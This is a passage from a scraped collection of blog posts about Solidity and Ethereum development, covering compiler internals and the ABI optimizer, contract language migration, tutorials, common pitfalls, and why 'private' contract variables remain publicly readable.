arrayType.copyForLocation(DataLocation::CallData, false);if (calldataType->isDynamicallySized()){    // put on stack: data_pointer length    CompilerUtils(m_context).loadFromMemoryDynamic(IntegerType(256), !_fromMemory);    // stack: base_offset data_offset next_pointer    m_context << Instruction::SWAP1 << Instruction::DUP3 << Instruction::ADD;    // stack: base_offset next_pointer data_pointer    // retrieve length    CompilerUtils(m_context).loadFromMemoryDynamic(IntegerType(256), !_fromMemory, true);    // stack: base_offset next_pointer length data_pointer    m_context << Instruction::SWAP2;    // stack: base_offset data_pointer length next_pointer}else{    // leave the pointer on the stack    m_context << Instruction::DUP1;    m_context << u256(calldataType->calldataEncodedSize()) << Instruction::ADD;}Since the EVM is a stack machine, you always have to keep track where the various values are stored when you write EVM assembly directly and because of that, there is a comment about the current stack layout in every second line. If you want to introduce a new variable, you have to go through the whole code and update it.The new ABI Encoder/DecoderIn contrast, this is a snippet of the code generating the new ABI encoder (and you will see why I say \"generating the ABI encoder\" instead of \"of the ABI encoder\" in a moment):function <functionName>(offset, end) -> array {    if iszero(slt(add(offset, 0x1f), end)) { revert(0, 0) }    let length := <retrieveLength>    array := <allocate>(<allocationSize>(length))    let dst := array    <storeLength> // might update offset and dst    let src := offset    <staticBoundsCheck>    for { let i := 0 } lt(i, length) { i := add(i, 1) }    {        let elementPos := <retrieveElementPos>        mstore(dst, <decodingFun>(elementPos, end))        dst := add(dst, 0x20)        src := add(src, <baseEncodedSize>)    }}The code above is responsible for decoding any kind of array type and at the same time, it performs bounds checks and cleanup on the decoded elements, which the old decoder did not do. It is written in our new intermediate language called iulia and is actually just a template. The various strings in angle brackets like <retrieveLength> will be replaced depending on the concrete array type we want to decode.Furthermore, the various small tasks like allocating memory, retrieving and storing the length of an array, cleanup of value types and so on, will be done in separate functions which are templates themselves. This makes the design very flexible and modular and most importantly easy to audit.The OptimizerThis modularity also has a drawback, which you will see if you take a look at the following code, which is the iulia code of the decoder for function f(uint, uint, uint) public {} with all templates expanded.function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        let offset := 0        value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }    {        let offset := 32        value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }    {        let offset := 64        value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }}function abi_decode_t_uint256(offset, end) -> value{    value := cleanup_revert_t_uint256(calldataload(offset))}function cleanup_revert_t_uint256(value) -> cleaned{    cleaned := value}Wait, why is there so much code? A human writing this manually would just use the much shorter functionfunction abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    if iszero(slt(sub(dataEnd, headStart), 0x60)) { revert(0, 0) }    value0 := calldataload(0)    value1 := calldataload(0x20)    value2 := calldataload(0x40)}It actually turns out that these two snippts of code are semantically equivalent. The many functions above are generated because of the modularity of the decoder and it would be really bad for the gas costs of the contract if this would be the final code the contract is compiled to.Luckily, compilers have a stage called the \"optimizer\", which takes code (usually written in the intermediate language) and transforms it into shorter or faster code that has exactly the same behaviour. We are currently working on the optimizer for iulia, especially the \"inlining expansion\" component. Such a component looks for function calls satisfying a certain criterion (for example that they call a function which is very short) and replace the function call by the code of the function itself. The function cleanup_revert_t_uint256 above is especially suitable for inlining because it does exactly nothing. For integer types shorter than 256 bytes, the decoder has to clean the value, but there is not nothing to be done for full 256 bit integers. Also abi_decode_t_uint256 should be inlined, since it only contains a single instruction after cleanup_revert_t_uint256 has been inlined. The code would look as follows after the function inlining step and removal of unused functions:function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        let offset := 0        value0 := calldataload(offset)    }    {        let offset := 32        value1 := calldataload(offset)    }    {        let offset := 64        value2 := calldataload(offset)    }}This is already almost where we want to go. We only need to do one additional step we call \"variable elimination\" or \"rematerialization\". It will replace a referenced variable by the expression that is currently assigned to it. This is especially useful if the variable is used only once or its value is a constant. After this step, we have the following code:function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        value0 := calldataload(0)    }    {        value1 := calldataload(32)    }    {        value2 := calldataload(64)    }}Apart from the extra blocks and the switch instead of the if, this is the same code as the one written manually above.ConclusionAs you have hopefully seen from this small example, it is possible to follow what the new optimizer does and whether it does everything correctly. Because the code still contains loops, functions, variables and expressions, everything stays more or less readable. Furthermore, the expressions keep the code well suited for stack-based machines like the EVM or WebAssembly machine.The previous EVM assembly based optimizer had a symbolic execution stage where it would build up its own impression of the code in memory and then re-generated the code from scratch in an optimized way. You can probably imagine that in this old optimizer, bugs were extremly hard to fix, especially when compared to the new optimizer. Because of that, we just turned off all of the stages of the old optimizer we were not confident in anymore.Of course the long-term goal is to use iulia in all parts of the compiler and not just the ABI encoder/decoder, but that part is a fairly isolated but yet complicated enough aspect of the Solidity compiler so that it makes to try it out there.", "responses": ""}, {"title": "Solidity Migration & What\u2019s\u00a0Next", "author_name": "Augur", "link": "https://medium.com/@AugurProject/solidity-migration-whats-next-3760d3e2936b?source=search_post", "post_date": "Sep 19, 2017", "readtime": "3 min read", "upvotes": "146", "content": "Solidity Migration & What\u2019s\u00a0NextAugurBlockedUnblockFollowFollowingSep 19, 2017Six weeks ago Augur and ZeppelinSolutions disclosed an audit of the Serpent compiler, revealing a critical security vulnerability effecting the Reputation (REP) token. After a few weeks of preparation, the REP token contract was migrated to Solidity in a few hours, and we began a sprint to migrate the rest of our codebase to Solidity. The strongest recommendation from the Zeppelin security audit was to switch to Solidity and deprecate Serpent.We\u2019re pleased to share that in the planned six week time frame, we have completed the migration from Serpent to Solidity. There is no longer any remaining legacy Serpent code in the augur-core contracts.We believe Solidity is a better foundation to build Augur off of in comparison to Serpent. One of our contract engineers, Micah, shared his opinion on Reddit the other day:In my opinion, Solidity is a much more mature language. The tooling is better, it has a real type system, and its static analyzer catches a lot more than Serpent\u2019s analyzer. It also is the language most other projects are using which means we now have a larger support network and it is easier to find answers to questions. The documentation for Solidity is also significantly better, so it requires less \u201cpoke it to figure out how it works\u201d than Serpent.That being said, there are a few annoyances that have bitten us, such as the Stack Too Deep issue.Overall, I\u2019m very happy for the migration and I believe that it will be a net positive for development velocity in the long run, as well as a net positive for security.-@MicahZoltu", "responses": "1"}, {"title": "Solidity ve Ethereum E\u011fitimi\u00a0Hakk\u0131nda", "author_name": "Mert Susur", "link": "https://medium.com/codefiction/solidity-ve-ethereum-e%C4%9Fitimi-hakk%C4%B1nda-977e92defbf4?source=search_post", "post_date": "Nov 1, 2017", "readtime": "2 min read", "upvotes": "170", "content": "Solidity ve Ethereum E\u011fitimi\u00a0Hakk\u0131ndaMert SusurBlockedUnblockFollowFollowingNov 1, 20172 g\u00fcn s\u00fcrecek olan ve online olarak ger\u00e7ekle\u015fecek Ethereum ve Solidity e\u011fitimi hakk\u0131nda bilgi almak i\u00e7in t\u0131klay\u0131n.Biliyorum biliyorum, son yaz\u0131mdan bu yana epey oldu ve arada bir de Ethereum bulu\u015fmas\u0131 ge\u00e7ti ve hakk\u0131nda rapor bile yazamad\u0131m. Ama merak etmeyin tembellik yapm\u0131yorum. Hatta Onur\u2019un da \u0130stanbul\u2019a d\u00f6nmesiyle daha da fazla \u00e7al\u0131\u015f\u0131yoruz diyebilirim.Neyse geyik yapmay\u0131 b\u0131rak\u0131p konuya bu yaz\u0131n\u0131n amac\u0131na geri d\u00f6nelim. Onur ile birlikte \u00fcniversite ve lise \u00f6\u011frencilerine \u00f6zel bir e\u011fitim haz\u0131rlad\u0131k. E\u011fitimi \u00fccretsiz bir \u015fekilde \u00f6\u011frencilere ve Patreon destek\u00e7ilerine sa\u011flayaca\u011f\u0131z. Yakla\u015f\u0131k \u00fc\u00e7 saat s\u00fcrecek online e\u011fitimde Ethereum\u2019dan, EVM\u2019den ve Solidity\u2019den bahsedece\u011fiz. G\u00fcn\u00fcn sonunda ise hedefimiz kat\u0131l\u0131mc\u0131lar\u0131n ak\u0131ll\u0131 kontrat yazabilmesini sa\u011flamak.Peki neden yap\u0131yoruz bunu?Cevap asl\u0131nda \u00e7ok basit, T\u00fcrkiye\u2019de teknolojinin ilerlemesini ve bu konuda olabildi\u011fimiz kadar destek olmak istiyoruz. Ancak bu e\u011fitime de sadece bu i\u015fe hevesli ve merakl\u0131 \u00f6\u011frencilerin kat\u0131lmas\u0131n\u0131 istiyoruz. Kimse al\u0131nmas\u0131n ama para kazanmak i\u00e7in yat\u0131r\u0131m tavsiyesi isteyenlerden yorulduk. Bu e\u011fitimde de bu konuda asla ve asla konu\u015fmayaca\u011f\u0131z.Nas\u0131l kat\u0131l\u0131r\u0131m?E\u011fitim i\u00e7in a\u00e7t\u0131\u011f\u0131m\u0131z sitemize girerek kayd\u0131n\u0131z\u0131 nas\u0131l yapaca\u011f\u0131n\u0131z hakk\u0131nda yeterli bilgiye eri\u015febilirsiniz.Nas\u0131l \u00e7al\u0131\u015f\u0131yor \u015fu ak\u0131ll\u0131\u00a0kontrat?Bunu incelemek i\u00e7in iki opsiyonunuz var, ya Rinkeby \u00fczerindeki 0xaef70b0d7da2654b0f73285854d0e694b6a7d8bd adresli ak\u0131ll\u0131 kontrat\u0131m\u0131za g\u00f6z atabilir ya da github \u00fczerindeki repository\u2019mize g\u00f6zatabilirsiniz.Ba\u015fka neler\u00a0var?Ba\u015fka \u015feyler tabi ki var! Hi\u00e7 olmaz m\u0131? \u00d6rne\u011fin Garanti Partners\u2019daki Blockchain ve Ethereum seminerinin videolar\u0131 youtube/codefiction kanal\u0131nda yay\u0131nland\u0131 mesela. \u0130zlemek i\u00e7in f\u0131rsat\u0131n\u0131z oldu mu?", "responses": ""}, {"title": "Top Solidity Tutorials", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/top-solidity-tutorials-4e7adcacced8?source=search_post", "post_date": "May 18, 2018", "readtime": "3 min read", "upvotes": "241", "content": "Top Solidity TutorialsSolidity tutorials and stories from writers on Coinmonks, Learn & build dapps on\u00a0ethereumGaurav AgrawalBlockedUnblockFollowFollowingMay 18, 2018sourceCreate Crypto\u00a0InvoicesCryptofi\u200a\u2014\u200aCreate Crypto Invoices, track your Crypto paymentsFind crypto jobs using Coinmonks jobs portalJoin Coinmonks contributors telegram group.Donate to CoinmonksClick to find blockchain JobsCheck latest Solidity\u00a0StoriesSolidity Development: Setting up environmentSolidity Development: Setting up environmentSetting up working environment for smart contract developmentmedium.comSolidity Development: Creating our first smart contractSolidity Development: Creating our first smart contractDeveloping smart contract for crypto gamemedium.com#HowToBUIDL Series (1 of n)#HowToBUIDL Series (1 of n)#BUIDL\u00a0:: Dev Environment Setup. This series is written for anyone searching for a way to break free. There\u2019s no reason\u2026medium.comA Gentle Introduction to Building a Full Stack DApp on Ethereum\u200a\u2014\u200aPart 1A Gentle Introduction to Building a Full Stack DApp on Ethereum\u200a\u2014\u200aPart 1In this tutorial, we\u2019ll build a simple dapp (decentralized application). The goal is to introduce all the pieces of the\u2026medium.comHow To: Compile a Solidity Smart Contract Using Node.jsHow To: Compile a Solidity Smart Contract Using Node.jsIn the previous blog post, we wrote a smart contract using the Solidity programming language.medium.comHow To: Write a Simple Smart ContractHow To: Write a Simple Smart ContractWe\u2019re going to write a simple smart contract using the Solidity programming language, and in the following posts we\u2019ll\u2026medium.comGetting started with Solidity development using TruffleGetting started with Solidity development using TrufflePresented by Yorke Rhodes January 31, 2017medium.comTesting Solidity with Truffle and Async/AwaitTesting Solidity with Truffle and Async/AwaitIf you were to ask a programmer/developer what the worst part of the job is, I think most would say writing tests. You\u2026medium.comLearn Solidity. Shark of The Pool\u200a\u2014\u200aPart 1Learn Solidity. Shark of The Pool\u200a\u2014\u200aPart 1In this series we will create a simple Dapp, based on Ethereum blockchain using Solidity smart contracts. In the later\u2026medium.comLinked Lists in SolidityLinked Lists in SolidityWe need an efficient structure to store a large number of entries in a smart contract that we can quickly traverse. It\u2026medium.comStorage vs Memory in SolidityStorage vs Memory in SolidityA simple example to make you thinkmedium.comReturn values in solidity contractsReturn values in solidity contractsIf the only other option is to revert, no point returning a boolmedium.comTaming the DApp with eventsTaming the DApp with eventsManaging state is tough. Managing UI complexity is tough. Managing state in your app, on the Ethereum blockchain and\u2026medium.comEthereum Contract InheritanceEthereum Contract InheritanceThis is an excerpt from the Concurrence Exploration of Contract Inheritance.medium.comTest A Smart Contract With TruffleTest A Smart Contract With TruffleIn the previous article, I showed you how to write the smart contract in the Remix editor. But it\u2019s not convenient to\u2026medium.comSolidity: Transaction-Ordering AttacksSolidity: Transaction-Ordering AttacksThis article will explain an attack vector in Ethereum Smart Contracts known as Transaction Ordering/Front Running\u2026medium.comSubverting the Circular Reference Error in SoliditySubverting the Circular Reference Error in SolidityRecently in my Solidity adventures I have been working on a simple messaging board contract (still in development) with\u2026medium.comIf you find these stories useful then follow our Coinmonks publication and learn more about blockchain and building\u00a0Dapps.Click to learn more about\u00a0Solidity", "responses": "1"}, {"title": "Serializing string arrays in\u00a0solidity", "author_name": "vasa", "link": "https://hackernoon.com/serializing-string-arrays-in-solidity-db4b6037e520?source=search_post", "post_date": "Jun 6, 2018", "readtime": "3 min read", "upvotes": "243", "content": "Serializing string arrays in\u00a0solidityvasaBlockedUnblockFollowFollowingJun 6, 2018TL;DR This GitHub repository is all you\u00a0need.Solidity is still in development and that\u2019s why it still lacks in a lot of features that a good programming language should have. One of the features which solidity is missing is that it cannot return or take multi-dimensional arrays as input. Well, that does not seem important but when we talk about strings, we realize that they are just arbitrary-length byte array(i.e. byte[]). So when you create a string array, you are creating a two-dimensional byte array(i.e. byte[][]). This is where we all get stuck. Kinda like a trap\u2026it\u2019s a\u00a0trap!That\u2019s enough of talking, let\u2019s get to work. The easiest and the most efficient way to get over this problem is to serialize the strings in the array(converting the strings in the array into byte form) and send all of them in one go. After we receive the string array in the byte form we can either pass the byte array as input to another solidity function or send it to user-end(node.js api) where we will de-serialize it back to the string array. Let\u2019s see how it works.Step 1: Serialize & De-serialize using\u00a0solidityFor serializing/de-serializing in solidity we will use Seriality which can be used to serialize and de-serialize any data type in solidity. Thanks to pouladzade.serialize.solYou will get some output like this (for startindex=1, endindex=2).0x737472696e6731000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007737472696e6732000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007737472696e6733000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007Now, pass this bytes buffer into getString()and you will get your strings back!Note: You have to include Seriality files to your project to make the contract working. You can do that from here.Step 2: De-serialize the byte buffer using javascriptNow, using javascript we can get our string array back.deserialize.jsPutting the above byte output in the js function we get the following output.[\u201cstring1\u201d, \u201cstring2\u201d]Voila, you successfully got your array back!easy as\u00a0that!This was just about the strings. You can do a lot of stuff using Seriality.", "responses": "1"}, {"title": "Serpent Compiler Vulnerability, REP & Solidity Migration", "author_name": "Augur", "link": "https://medium.com/@AugurProject/serpent-compiler-vulnerability-rep-solidity-migration-5d91e4ae90dd?source=search_post", "post_date": "Jul 28, 2017", "readtime": "3 min read", "upvotes": "132", "content": "Serpent Compiler Vulnerability, REP & Solidity MigrationAugurBlockedUnblockFollowFollowingJul 28, 2017Update: REP migration is complete!If you are a REP holder, there is nothing you need to do!New REP contract\u00a0: 0xE94327D07Fc17907b4DB788E5aDf2ed424adDff6UPDATE: All EtherDelta and Oasis users have been refunded / paid back. Please let us know if you have any questions or problems.", "responses": "3"}, {"title": "Solidity Pitfalls and How to Avoid\u00a0Them", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/solidity-pitfalls-and-how-to-avoid-them-24ba87735c7a?source=search_post", "post_date": "Mar 23, 2018", "readtime": "4 min read", "upvotes": "623", "content": "Solidity Pitfalls and How to Avoid\u00a0ThemMichiel MuldersBlockedUnblockFollowFollowingMar 23, 2018\u201cThe currently unrivaled programming language for smart contracts is Solidity for the Ethereum blockchain.\u201d - Alfred Shaffir iOlite.ioSolidity is still a new, fast-changing language which has some serious pitfalls. As with all new things, bugs and logical faults are inevitable. Luckily, the ICO craze has triggered a new movement of research into the security aspects of blockchain and high-level programming languages as certain smart contracts hold millions of dollars, making it a perfect target for hackers.This article is based on the following research paper: \u201cEthereum Smart Contracts: Security Vulnerabilities and Security Tools\u201d written by Ardit Dika at the Norwegian University of Science and Technology.ERC20 critical\u00a0bugERC20 assumes two ways of performing a token transaction.The transfer function lets you send tokens to someone\u2019s address.For depositing tokens to a smart contract, you have to use the combination \u2018approve & transferFrom\u2019.But, when you send tokens to a smart contract using the transfer function, the smart contract won\u2019t detect your deposit request. This results in permanently losing your funds. A lot of novel developers have experienced this critical bug firsthand.Standards like ERC223 and ERC777 try to mitigate this bug. More specifically, ERC223 allows developers to send funds to an address or contract using the same function: transfer. ERC223 allows developers to handle incoming token transactions, and reject non-supported tokens. At last, the ERC223 token standard is more efficient as it\u2019s a one-step process, rather than the approve & transferFrom two-step process. In short, ERC777 focuses on adoption by offering a wide range of transaction handling mechanisms.\u200a\u2014\u200aSource: Cointelligence.Unchecked send\u00a0functionKalra S., Goel S., et al have recently published a research paper on analyzing the safety of smart contracts. They describe the problem of the unchecked send function: \u201cSince Solidity allows only 2300 gas upon a send call, a computation-heavy fallback function at the receiving contract will cause the invoking send to fail. Contracts that do not correctly handle such failed invocations and allow modifications to the global state following the failed send call, may incorrectly lead to loss of Ether.\u201dPublicly visible\u00a0dataAll data on the Ethereum blockchain is publicly visible to anyone. Regardless of the positive impact Ethereum has, the benefits are limited by this property. Companies cannot use Ethereum to pay the wages of their employees as that would expose their monthly income.As you can see, there is a serious need for blockchains that introduce more security properties like encryption, data obfuscation, and secure transaction handling mechanisms. The Enigma project is doing a great thing with its so-called \u2018secret smart contracts\u2019.Unchangeable smart contractsOnce a smart contract is deployed, it\u2019s not possible to modify or alter it. It\u2019s advantageous as it represents a trustworthy platform. On the other side, due to this property, a significant number of smart contracts contain vulnerabilities that can be exploited gaining illegal profit.In addition, a common safety guide for ICOs is to use an arbitrary name when deploying their ICO smart contract on the testnet. It has happened before an ICO smart contract got hacked because attackers were able to locate the testnet smart contract weeks before the actual deployment on the main net, giving them enough time to find critical bugs.In 2016, a symbolic execution analysis tool (Oyente) was developed by Luu et al. This tool revealed 45% of the 19,366 smart contracts back then were vulnerable for at least one known security issue.Exceeding the maximum gas\u00a0amountLet\u2019s end with a slightly funny problem. The GovernMental website was doing a jackpot. A large amount of 1100 ETH could be claimed by the lucky winner. However, because of a bug in the code, a gas amount of 5057945 was needed to claim the Ether. However, back then, the maximum gas amount for a transaction is only 4712388.The problem was caused by an array that looped all creditors and deleted them one by one, returning the winner. Even Vitalik Buterin jumped in and gave this piece of advice: \u201cIn general, it seems like we need one new piece of standard advice for contract developers: make sure that if you have arrays that users can extend then either find some way for each user to separately handle the array elements associated with themselves or split up the work among several transactions.\u201dLuckily, this problem has been solved now. Such hard-to-find problems will keep popping up in the future.Golden Tip: Use Experts and Audit Audit\u00a0Audit!I don\u2019t want to be rude, but don\u2019t trust novel Solidity developers to code your ICO smart contract. Proper developers know the problems that have occurred in the past and know how to respond to it.Most Solidity contracts being developed will be used for ICOs, so we are speaking about millions of dollars. Have your smart contract audited by several independent organizations, it\u2019s for your own safety.Another possibility is to use platforms that assist you in the creation of a smart contract. The iOlite product is a community-driven tool that accepts natural language or any other programming language as input for the creation of smart contracts. Solidity experts are able to define structures linked to their smart contract code. iOlite uses a modified version of the Stanford Natural Language Processing engine. The whole idea is based on machine training, driven by a community of Solidity experts. The benefit of iOlite is that it allows you to craft smart contracts easily and for free.Find out more about iOlite.io or join their Telegram channel.", "responses": "5"}, {"title": "", "author_name": "Aventus Network", "link": "https://medium.com/coinmonks/stack-too-deep-error-in-solidity-608d1bd6a1ea?source=search_post", "post_date": "Jan 7", "readtime": "16 min read", "upvotes": "230", "content": "\u201cStack Too Deep\u201d- Error in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJan 7Happy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.", "responses": "1"}, {"title": "Linked Lists in\u00a0Solidity", "author_name": "Austin Thomas Griffith", "link": "https://medium.com/coinmonks/linked-lists-in-solidity-cfd967af389b?source=search_post", "post_date": "Nov 13, 2017", "readtime": "5 min read", "upvotes": "238", "content": "Linked Lists in\u00a0SolidityAustin Thomas GriffithBlockedUnblockFollowFollowingNov 13, 2017We need an efficient structure to store a large number of entries in a smart contract that we can quickly traverse. It must also be very cheap to add new items, even as the amount of items grows.The mapping data type in solidity is wonderful for storing information, but very hard to look through if you don\u2019t already know the index of each item.With a linked list you store an index to the next piece of data in the current piece of data like a chain. To make writes our most efficient operation, we want to add items to the front of the list by keeping track of a head index. When we want to add a new element we put the existing head index in as the new element\u2019s next index and then set the head to the new element. This operation costs the same computational amount for a list of any size. When we want to look through the data, we start at the head index and follow the trail of next indexes.", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/i-initially-read-the-docs-at-http-solidity-readthedocs-io-en-develop-2e4e1f1bf0d1?source=search_post", "post_date": "Jan 27, 2018", "readtime": "", "upvotes": "178", "content": "Dave KajpustBlockedUnblockFollowFollowingJan 27, 2018I initially read the docs at http://solidity.readthedocs.io/en/develop/.Then I watched this guys videos on ethereum dApp development\u200a\u2014\u200ahttps://www.youtube.com/channel/UC8CB0ZkvogP7tnCTDR-zV7gThen I started looking into random projects that already built out smart contracts and I started trying to understand it, and run tests in the solidity IDE at https://remix.ethereum.orgI hope that helps!", "responses": ""}, {"title": "BANKEX Foundation: floating point library for\u00a0Solidity", "author_name": "BANKEX", "link": "https://blog.bankex.org/bankex-foundation-floating-point-library-for-solidity-a6dd87636693?source=search_post", "post_date": "Oct 19, 2017", "readtime": "3 min read", "upvotes": "724", "content": "BANKEX Foundation: floating point library for\u00a0SolidityBANKEXBlockedUnblockFollowFollowingOct 19, 2017BANKEX Foundation presents an open-source platform for collaborative work, created to promote technologies in banking and fintech sectors. It means that BANKEX Foundation is building an ecosystem that will help ensure transparency, stability and support, needed to implement blockchain technologies for the purpose of commercial integration. In this article we are explaining floating point library for Solidity, a non-profit product created by BANKEX for community.\u2014 Implementation of floating point number will expand capabilities of Ethereum in terms of more general and convenient calculations (and get rid of artificial decimal multipliers).\u2014 Don\u2019t forget about the convenience\u200a\u2014\u200awe are used work with numbers containing decimal point.\u2014 And finally\u200a\u2014\u200afor precision of calculations in financial world special \u201cDecimal\u201d data type is traditionally used, and experience implementing floating point numbers can be transferred to this type also.It\u2019s known that at the current stage of development, Solidity can only operate on integers (up to 256 bit, signed and unsigned), with fixed point numbers pushed for further development (in a form of ufixed/fixed type), and without any solid plans for floating point implementation. To fix this issue, make programming more convenient and open opportunities to use of wider classes of functions we\u2019ve started a development of binary256 IEEE standard floating point numbers implementation using available functions and types such as uint256, bytes32, additions, multiplications and bit shifts.We encourage an Ethereum community to contribute to development of this library and hope to see it included either to EVM or as precompiled contract in further versions of Ethereum.Current branch is located at:https://github.com/BankEx/solidity-float-point-calculationFor the initial public release, we have focused on basic functions necessary for further implementations of standard math library.This version includes:encoding and decoding of packed 256 bit representation (in a form of bytes32 base type) to intermediate representation of three unsigned 256 bit integers for sign, mantissa and exponent. Intermediate representation is more convenient for basic operations such as addition.Addition, subtraction, multiplication and naive divisionFast inverse square root and fast divisionLog2 functionOne of the most difficult design decisions was implementation of division operation. As we all know, division operation is always more expensive and slower than addition or multiplication, and on Ethereum network that would incur additional gas price. We have implemented two division algorithms\u200a\u2014\u200aone is naive, that obtains one bit of mantissa at the time, requiring more than 200 integer divisions and bit shifts in total. Another algorithm was based on fast inverse square root, with great details about inverse square root can be found in a work of Matthew Robertson.This algorithm was expanded to 256 representation and implemented. Both fast inverse square root and fast division provide relative precision better than 0.01 that can be tuned further at the price of performance.From the long list of standard math functions float logarithm of a base two was implemented to demonstrate use of basic operations for composition of more complicated functions.This library is not ready for production yet, although binary encoding of numbers should not change. Current problems and further work can be found in github repository. Feel free to submit pull requests with new algorithms or other implementations.Motivation:Why implement it in solidity: reference implementation in Solidity can be easily transformed to implementations in other languages for precompiled contract creationWhy binary256: 32 bytes is a natural storage slot length and using lesser sizes would not always be beneficial in terms of storage and all operations except float division don\u2019t have a large dependency in gas price on argument structureWhy implement float point type at the first place: we believe that at some point float point operations will be necessary to implement in solidity. For example a \u201cDecimal\u201d data type is necessary for convenience of financial operations and experience gained during creation of float type can be transferedBy ALEX VLASOV, BANKEX Blockchain developer and System Architect", "responses": "1"}, {"title": "", "author_name": "Aventus Network", "link": "https://blog.aventus.io/stack-too-deep-error-in-solidity-5b8861891bae?source=search_post", "post_date": "Jan 4", "readtime": "16 min read", "upvotes": "300", "content": "\u201cStack Too Deep\u201d- Error in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJan 4Happy New Year and may we all have great accomplishments in 2019! Aventus is welcoming you back from the winter holidays with a post related to errors in Solidity, by our very own, Alex Pinto.", "responses": "1"}, {"title": "Your \u201cprivate\u201d Solidity Variable is Not \u201cprivate.\u201d Save it before it becomes\u00a0Public", "author_name": "vasa", "link": "https://hackernoon.com/your-private-solidity-variable-is-not-private-save-it-before-it-becomes-public-52a723f29f5e?source=search_post", "post_date": "Jul 17, 2018", "readtime": "4 min read", "upvotes": "200", "content": "Your \u201cprivate\u201d Solidity Variable is Not \u201cprivate.\u201d Save it before it becomes\u00a0PublicHow to keep secrets on\u00a0EthereumvasaBlockedUnblockFollowFollowingJul 17, 2018If you have worked with Ethereum then you must have written smart contracts, and thus most probably used the keyword private\u00a0. It seems like it does its work well. Right? Well, actually not when it comes to keep secrets on ethereum.Anyone in this world with a blockchain explorer can see your so called private variables.Sounds ridiculous, but yes its true. Let\u2019s see how to hack a contract.Hacking Smart contractsLet\u2019s take a vulnerable contract.It\u2019s basically a game: an odd-even multiplayer game contract, which chooses the winner based on the numbers guessed. Each player chooses a number and if the sum is even then the first player wins, otherwise the second player wins.The game contract stores the bets of two players in players mapping. Since this variable is declared as private, the second player cannot read the data. Each player has to transfer 1 Ether to the contract in order to play. This condition is checked using require. Once the second player places his bet, the winner is selected based on the odd-even logic and gets the whole bet amount of both players.Let\u2019s place our bet(execute play(100)). As the number we bet is private so no one can see it. It\u2019s like a secret\u2026But wait. Let\u2019s see what actually happened when we executed this transaction.State changes in Ethereum are usually done through a transaction. If the receiving account is a contract in a transaction, the EVM runs the contract\u2019s code either to completion or until the execution runs out of gas.Details, such as which method to call and input parameters are specified in the data field of each transaction. For example, for modifying a private state variable in the contract, you need to pass the \u201cprivate\u201d value to the setter method through a transaction. Considering the fact that every transaction data is visible to all the nodes, you could easily read private variables if you know the transaction.Let\u2019s look into the odd-event contract that we discussed above and see how you can decode the transaction data.For every method call, the transaction data will have 2 fields:Method selectorMethod parametersIn our smart contract, call to the method will have the following transaction data. Let\u2019s try to decode this.0x6587f6ec0000000000000000000000000000000000000000000000000000000000000064First 4 bytes of the transaction data always points to the method signature. It is calculated by taking the first 4 bytes of keccak hash of the method signature. In our example, it is bytes4(keccak256('play(uint)')) which is 0x6587f6ec.The following characters point to the parameter of the specified method. Each parameter is represented by the hex value of the input padded to 32 bytes. If 100 is the input parameter to play method, then the transaction data for that parameter is:0x0000000000000000000000000000000000000000000000000000000000000064BUSTED!Well, now any one with a block explorer and a bit of knowledge can place his 2nd bet accordingly and rip you off.This can get more complex if there are more parameters and they are dynamic. You can get more details about argument encoding from the official solidity documentation.The question now comes is that is there any way to avoid this kind of hack? Well there are some solutions to this:One is to use Quorum instead of Ethereum. It basically allows you to send private transactions. You can specify addresses of the recipients(in this case the address of the contract) in privateFor variable which will only allow the recipients to see the data parameter; while others will receive a blank data parameter. (I have left a lot of details here on how the it works. You can find them here).Another way to tackle this problem while using Ethereum only is using something called commit reveal pattern. In this method, users first submit the hash of a secret information and when everyone else has submitted theirs, each participant reveals their vote, which can be back verified. This is not suited for all the applications, and it adds a lot of complexity on users, but it\u2019s a starting point for further explorations.", "responses": "3"}, {"title": "Solidity Learning: State Specifiers and STATICCALL", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/state-specifiers-and-staticcall-d50d5b2e4920?source=search_post", "post_date": "Sep 27, 2017", "readtime": "5 min read", "upvotes": "212", "content": "Solidity Learning: State Specifiers and STATICCALLUpcoming Changes to Solidity and How They\u00a0FunctionSteven McKieBlockedUnblockFollowFollowingSep 27, 2017Crosspost: This post was originally written by \u201cNiran\u201d of ConsenSys and can be found here. This was posted with his permission, enjoy!One of the biggest barriers to writing and reviewing safe smart contracts is understanding when the state can be modified during a chain of function calls. Reentrancy vulnerabilities have been a huge cause for concern\u200a\u2014\u200aattempting to simply read from another contract\u2019s storage can lead to a loss of assets if done improperly. Both Solidity and the EVM are introducing features that make it safer to ask other contracts about their storage.Solidity 0.4.16 added two new specifiers for contract functions: pure and view. Solidity 0.4.17 adds the ability to enforce those specifiers\u2014if you attempt to read or write to storage or log events in the body of a function that claims not to do so, your contract will not compile. This is disabled by default for backwards compatibility.pure was introduced to specify functions that do not read or modify the state of the blockchain, like math functions.view was introduced to specify functions that can read, but can never modify the state of the blockchain. view is an alias for constant, an existing specifier that was not enforced by the compiler.Use these specifiers to clarify the intended behavior of your functions. As you write your contracts, Solidity will suggest one of these state mutability specifiers when it detects functions that don\u2019t read and/or write to the blockchain.Beyond helping others understand your codebase, pure and view are important parts of the interface between Solidity contracts. If a function makes calls to other functions or other contracts, Solidity will check if the specifiers on those functions can violate the claims of the calling function.In 